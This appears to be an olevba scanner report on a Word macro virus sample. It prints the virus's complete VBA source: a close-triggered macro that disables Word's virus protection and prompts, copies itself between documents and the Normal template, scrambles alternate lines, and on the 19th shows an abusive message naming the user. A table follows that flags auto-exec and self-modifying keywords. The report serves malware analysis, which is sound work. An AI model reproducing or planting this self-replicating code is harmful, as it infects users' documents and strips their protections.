olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-07567d8f4eec5cfaeb584b46586084b6e1fe5963
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-07567d8f4eec5cfaeb584b46586084b6e1fe5963 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()

On Error Resume Next

Options.SaveNormalPrompt = 0

TT79 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.ConfirmConversions = 0

Options.VirusProtection = 0

Application.EnableCancelKey = 0

GH44 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set KS22 = ActiveDocument.VBProject.VBComponents.Item(1)

JM57 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set KS22 = NormalTemplate.VBProject.VBComponents.Item(1)

OI80 = True

End If

If OI80 <> True And JM57 <> True Then GoTo US19

If OI80 = True Then KS22.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GH44 - 1))

If JM57 = True Then KS22.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TT79 - 1))

With KS22.CodeModule

For x = 2 To (KS22.CodeModule.CountOfLines - 1) Step 2

.replaceline x, "'" & Application.ActiveWindow & Application.ActiveDocument & Now

Next x

End With

If Month(Now) = Month(Now) And Day(Now) = 19 Then MsgBox "I think " & Application.UserName & " and Birgit is a bitch!"

US19:

If TT79 <> 0 And GH44 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

